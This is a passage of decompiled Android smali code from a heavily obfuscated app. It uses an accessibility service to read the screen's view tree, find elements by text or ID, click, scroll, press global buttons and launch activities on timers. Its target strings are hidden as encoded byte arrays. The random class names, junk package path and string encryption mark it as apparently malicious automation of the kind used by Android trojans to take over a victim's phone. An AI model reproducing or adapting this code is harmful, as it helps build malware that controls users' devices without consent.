    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x1f

    new-array v0, v0, [B

    fill-array-data v0, :array_c

    new-array v2, v1, [B

    fill-array-data v2, :array_d

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    :cond_2
    if-nez p0, :cond_3

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    :cond_3
    if-eqz p0, :cond_4

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$b;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$b;-><init>()V

    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_2

    :cond_4
    sget-boolean p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u:Z

    if-eqz p0, :cond_5

    new-instance p0, Ljava/lang/Thread;

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/az;

    invoke-direct {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/az;-><init>()V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p0}, Ljava/lang/Thread;->start()V

    goto :goto_2

    :cond_5
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    :goto_2
    return-void

    :cond_6
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    return-void

    :cond_7
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    return-void

    :array_0
    .array-data 1
        0x3dt
        0x3at
        0x58t
        0x5bt
        -0x3bt
        -0x4t
        -0x1ft
        -0x1bt
        0x2dt
        0x7bt
        0x57t
        0x14t
        -0x22t
        -0x8t
        -0x18t
        -0x1et
        0x27t
        0x6ft
        0x5ct
        0x11t
        -0x7bt
        -0x13t
        -0x1dt
        -0x7t
        0x33t
        0x34t
        0x41t
        0x10t
        -0x32t
        -0x2dt
        -0x1bt
        -0x7t
        0x30t
        0x21t
        0x6at
        0x19t
        -0x35t
        -0xbt
        -0x1et
        -0x1bt
        0x2at
    .end array-data

    nop

    :array_1
    .array-data 1
        0x5et
        0x55t
        0x35t
        0x75t
        -0x56t
        -0x74t
        -0x73t
        -0x70t
    .end array-data

    :array_2
    .array-data 1
        0x24t
        -0x26t
        -0x37t
        -0x36t
        0x14t
        0x52t
        -0x7ct
        -0x75t
        0x35t
        -0x26t
        -0x29t
        -0x36t
        0x18t
        0x4dt
        -0x68t
        -0x75t
        0x20t
        -0x40t
        -0x3bt
        -0x6at
        0x13t
        0x58t
        -0x7ct
        -0x7et
        0x7dt
        -0x24t
        -0x40t
        -0x35t
        0x16t
        0x53t
        -0x7ft
        -0x77t
        0x26t
        -0x3ft
        -0x3ft
        -0x80t
        0x28t
        0x55t
        -0x7ft
        -0x76t
        0x33t
        -0x16t
        -0x38t
        -0x7bt
        0xet
        0x52t
        -0x63t
        -0x70t
    .end array-data

    :array_3
    .array-data 1
        0x47t
        -0x4bt
        -0x5ct
        -0x1ct
        0x77t
        0x3dt
        -0x18t
        -0x1ct
    .end array-data

    :array_4
    .array-data 1
        0x10t
        0x6dt
        -0x5t
        0xet
        -0x76t
        0x7ct
        0xdt
        -0x57t
        0x0t
        0x2ct
        -0xct
        0x41t
        -0x6ft
        0x78t
        0x4t
        -0x52t
        0xat
        0x38t
        -0x1t
        0x44t
        -0x36t
        0x7ft
        0x4t
        -0x43t
        0x1t
        0x61t
        -0x2t
        0x7ft
        -0x6bt
        0x60t
        0x0t
        -0x58t
        0x16t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x73t
        0x2t
        -0x6at
        0x20t
        -0x1bt
        0xct
        0x61t
        -0x24t
    .end array-data

    :array_6
    .array-data 1
        0x62t
        -0x29t
        0x5dt
        -0x44t
        -0xdt
        -0x3t
        0x61t
        -0x28t
        0x72t
        -0x6at
        0x52t
        -0xdt
        -0x18t
        -0x7t
        0x68t
        -0x21t
        0x78t
        -0x7et
        0x59t
        -0xat
        -0x4dt
        -0x2t
        0x68t
        -0x34t
        0x73t
        -0x25t
        0x58t
        -0x33t
        -0x11t
        -0x1t
        0x6et
        -0xet
        0x75t
        -0x23t
        0x48t
        -0x1at
    .end array-data

    :array_7
    .array-data 1
        0x1t
        -0x48t
        0x30t
        -0x6et
        -0x64t
        -0x73t
        0xdt
        -0x53t
    .end array-data

    :array_8
    .array-data 1
        0x20t
        -0x29t
        0x5t
        -0x77t
        -0x16t
        0x12t
        -0x5t
        0x40t
        0x31t
        -0x29t
        0x1bt
        -0x77t
        -0x1at
        0xdt
        -0x19t
        0x40t
        0x24t
        -0x33t
        0x9t
        -0x2bt
        -0x13t
        0x18t
        -0x5t
        0x49t
        0x79t
        -0x2ft
        0xct
        -0x78t
        -0x6t
        0x18t
        -0xat
        0x5dt
        0x20t
        -0x30t
        0x37t
        -0x2ct
        -0x5t
        0x1et
        -0x38t
        0x5bt
        0x26t
        -0x40t
        0x1ct
    .end array-data

    :array_9
    .array-data 1
        0x43t
        -0x48t
        0x68t
        -0x59t
        -0x77t
        0x7dt
        -0x69t
        0x2ft
    .end array-data

    :array_a
    .array-data 1
        -0x5dt
        -0xbt
        0x6dt
        -0x18t
        0x7ct
        0x5dt
        -0x18t
        -0x7ct
        -0x4dt
        -0x4ct
        0x62t
        -0x59t
        0x67t
        0x59t
        -0x1ft
        -0x7dt
        -0x47t
        -0x60t
        0x69t
        -0x5et
        0x3ct
        0x5dt
        -0x19t
        -0x62t
        -0x61t
        -0x12t
        0x65t
        -0x42t
        0x67t
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x40t
        -0x66t
        0x0t
        -0x3at
        0x13t
        0x2dt
        -0x7ct
        -0xft
    .end array-data

    :array_c
    .array-data 1
        -0x5et
        -0x4t
        0x21t
        -0x36t
        -0x59t
        0x2ct
        -0x54t
        0x18t
        -0x4dt
        -0x4t
        0x3ft
        -0x36t
        -0x5at
        0x22t
        -0x4ct
        0x3t
        -0x5ct
        -0x1ft
        0x35t
        -0x22t
        -0x53t
        0x27t
        -0x11t
        0x7t
        -0x5et
        -0x4t
        0x13t
        -0x70t
        -0x5ft
        0x3bt
        -0x4ct
    .end array-data

    :array_d
    .array-data 1
        -0x3ft
        -0x6dt
        0x4ct
        -0x1ct
        -0x3ct
        0x43t
        -0x40t
        0x77t
    .end array-data

    :array_e
    .array-data 1
        -0x3bt
        -0x40t
        0x5dt
        0x57t
        -0x1t
        -0x50t
        -0x13t
        -0x38t
        -0x33t
        -0x36t
        0x16t
        0x51t
        -0x7t
        -0x53t
        -0x1bt
        -0x69t
    .end array-data

    :array_f
    .array-data 1
        -0x5ct
        -0x52t
        0x39t
        0x25t
        -0x70t
        -0x27t
        -0x77t
        -0xet
    .end array-data
.end method

.method public static synthetic e(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a2(Landroid/os/Handler;)V

    return-void
.end method

.method static synthetic e0(I)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L1(I)V

    return-void
.end method

.method private static e1(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/util/List;)V
    .locals 3

    .line 1
    if-nez p0, :cond_0

    return-void

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v1

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    goto :goto_0

    :cond_1
    if-eqz v1, :cond_2

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    :goto_0
    invoke-interface {p2, p0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_2
    const/4 v0, 0x0

    :goto_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_4

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-static {v1, p1, p2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e1(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/util/List;)V

    if-eqz v1, :cond_3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    :cond_3
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :cond_4
    return-void
.end method

.method private static synthetic e2()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->r1()V

    return-void
.end method

.method private static e3(I)V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    :try_start_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    const/4 v0, 0x2

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    const/4 v0, 0x0

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->T0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_0

    :cond_1
    if-lez p0, :cond_2

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0xf

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0xc8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    add-int/lit8 p0, p0, -0x1

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e3(I)V

    goto :goto_0

    :cond_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    :cond_3
    :goto_0
    return-void

    :array_0
    .array-data 1
        0x54t
        0x19t
        0x9t
        0x52t
        -0x7t
        -0x6et
        -0x79t
        -0x14t
        0x5ct
        0x13t
        0x42t
        0x4ct
        -0x1t
        -0x78t
        -0x69t
    .end array-data

    :array_1
    .array-data 1
        0x35t
        0x77t
        0x6dt
        0x20t
        -0x6at
        -0x5t
        -0x1dt
        -0x2at
    .end array-data
.end method

.method public static synthetic f(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->m2(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method static synthetic f0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->J1()V

    return-void
.end method

.method public static f1(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 5

    .line 1
    const/4 v0, 0x0

    if-eqz p0, :cond_2

    if-nez p1, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v1, :cond_2

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_1

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    return-object v3

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    :goto_1
    return-object v0
.end method

.method private static synthetic f2(Landroid/os/Handler;)V
    .locals 3

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->l1()V

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nz;

    invoke-direct {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nz;-><init>()V

    const-wide/16 v1, 0xdac

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method static f3(Ljava/lang/String;)Ljava/util/List;
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_0
    if-nez v0, :cond_1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_1
    if-nez v0, :cond_2

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_2
    if-nez v0, :cond_3

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_3
    if-nez v0, :cond_4

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_4
    if-nez v0, :cond_5

    const/4 p0, 0x0

    return-object p0

    :cond_5
    invoke-virtual {v0, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic g()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->t2()V

    return-void
.end method

.method static synthetic g0()Ljava/util/List;
    .locals 1

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->p1()Ljava/util/List;

    move-result-object v0

    return-object v0
.end method

.method private static g1(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 1

    .line 1
    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_0

    return-object p0

    :cond_1
    const/4 p0, 0x0

    return-object p0
.end method

.method private static synthetic g2(Landroid/os/Handler;)V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/hz;

    invoke-direct {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/hz;-><init>(Landroid/os/Handler;)V

    const-wide/16 v1, 0x3e8

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static g3(I)V
    .locals 2

    .line 1
    int-to-long v0, p0

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0
.end method

.method public static synthetic h()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->H2()V

    return-void
.end method

.method static synthetic h0(Ljava/util/List;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->O1(Ljava/util/List;)V

    return-void
.end method

.method private static h1(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 4

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object p0

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qy;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qy;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x1f4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static synthetic h2(Landroid/os/Handler;)V
    .locals 3

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x800000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/vy;

    invoke-direct {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/vy;-><init>(Landroid/os/Handler;)V

    const-wide/16 v1, 0x3e8

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static h3(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 3

    .line 1
    sput-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance p0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {p0, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$k;

    invoke-direct {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$k;-><init>()V

    const-wide/32 v1, 0xc350

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Draws_overs:Ljava/lang/String;

    const/4 v0, 0x1

    new-array v0, v0, [B

    const/4 v1, 0x0

    const/16 v2, -0x76

    aput-byte v2, v0, v1

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h1(Landroid/accessibilityservice/AccessibilityService;)V

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->C0()V

    return-void

    nop

    :array_0
    .array-data 1
        -0x45t
        -0x17t
        -0x19t
        0x2et
        0x7et
        -0x47t
        -0x7et
        0x57t
    .end array-data
.end method

.method public static synthetic i(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->C2(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic i0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->N1()V

    return-void
.end method

.method private static i1()V
    .locals 4

    .line 1
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d;

    invoke-direct {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$d;-><init>()V

    const-wide/16 v2, 0xc8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static synthetic i2()V
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z4;->a(Landroid/content/Context;)Ljava/lang/String;

    return-void
.end method

.method public static synthetic j(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->q2(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic j0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->V2()V

    return-void
.end method

.method private static j1()V
    .locals 4

    .line 1
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j;

    invoke-direct {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$j;-><init>()V

